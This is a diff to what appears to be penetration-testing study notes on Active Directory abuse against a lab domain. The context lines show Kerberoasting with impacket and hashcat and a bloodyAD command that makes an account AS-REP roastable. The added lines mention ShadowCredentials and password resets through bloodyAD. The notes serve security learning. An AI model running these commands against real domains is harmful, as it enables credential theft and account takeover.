@@ -36,6 +36,8 @@ impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-use
 hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
 ```
 
+It also allows for a ShadowCredentials attack.
+
 
 ### GenericAll
 
@@ -48,6 +50,8 @@ We can also add the dont_req_preauth setting so that the account is ASREProastab
 ```
 bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k add uac <username_of_target_account> -f DONT_REQ_PREAUTH
 ```
+
+We can also use bloodyAD to change a target user's password.
 
 ### WriteDacl
 
